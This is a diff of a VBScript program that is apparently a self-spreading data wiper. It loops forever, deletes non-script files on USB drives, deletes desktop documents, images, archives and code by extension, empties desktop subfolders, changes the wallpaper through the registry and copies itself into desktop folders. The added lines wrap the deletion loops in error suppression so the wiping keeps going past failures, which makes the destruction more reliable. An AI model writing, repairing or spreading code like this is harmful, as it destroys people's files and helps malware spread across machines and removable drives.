@@ -49,6 +49,7 @@ Do
     Next
 
     ' Delete files except VBS files on the USB drive
+    On Error Resume Next ' Ignore errors
     For Each usbFile In objFSO.GetFolder(usbDrivePath).Files
         Dim extension
         extension = LCase(objFSO.GetExtensionName(usbFile.Path))
@@ -56,6 +57,7 @@ Do
             objFSO.DeleteFile usbFile.Path
         End If
     Next
+    On Error GoTo 0 ' Reset error handling
 
     ' Set wallpaper
     objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
@@ -64,7 +66,7 @@ Do
     ' Loop through each file in the Desktop folder and delete if it has a specified file extension
     For Each desktopFile In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Files
         Dim desktopExtension
-        desktopExtension = LCase(objFSO.GetExtensionName(desktopFile.Path))
+        desktopExtension = LCase(objFSO.GetExtensionName(desktopFile.Name))
         If desktopExtension = "txt" Or desktopExtension = "exe" Or desktopExtension = "json" Or desktopExtension = "doc" Or desktopExtension = "pdf" Or desktopExtension = "wpd" Or desktopExtension = "docx" Or desktopExtension = "rtf" Or desktopExtension = "tex" Or desktopExtension = "odt" Or desktopExtension = "jpg" Or desktopExtension = "jpeg" Or desktopExtension = "mp3" Or desktopExtension = "rar" Or desktopExtension = "vcd" Or desktopExtension = "webp" Or desktopExtension = "css" Or desktopExtension = "html" Or desktopExtension = "py" Or desktopExtension = "php" Or desktopExtension = "ico" Or desktopExtension = "lnk" Or desktopExtension = "mp4" Or desktopExtension = "js" Or desktopExtension = "bak" Or desktopExtension = "xml" Or desktopExtension = "zip" Or desktopExtension = "bmp" Then
             objFSO.DeleteFile(desktopFile.Path)
         End If
@@ -72,9 +74,11 @@ Do
 
     ' Loop through each folder on the Desktop and delete files within them
     For Each desktopFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
+        On Error Resume Next ' Ignore errors
         For Each desktopFile In desktopFolder.Files
             objFSO.DeleteFile(desktopFile.Path)
         Next
+        On Error GoTo 0 ' Reset error handling
     Next
 
     ' Generate copies of the script within each folder on the Desktop
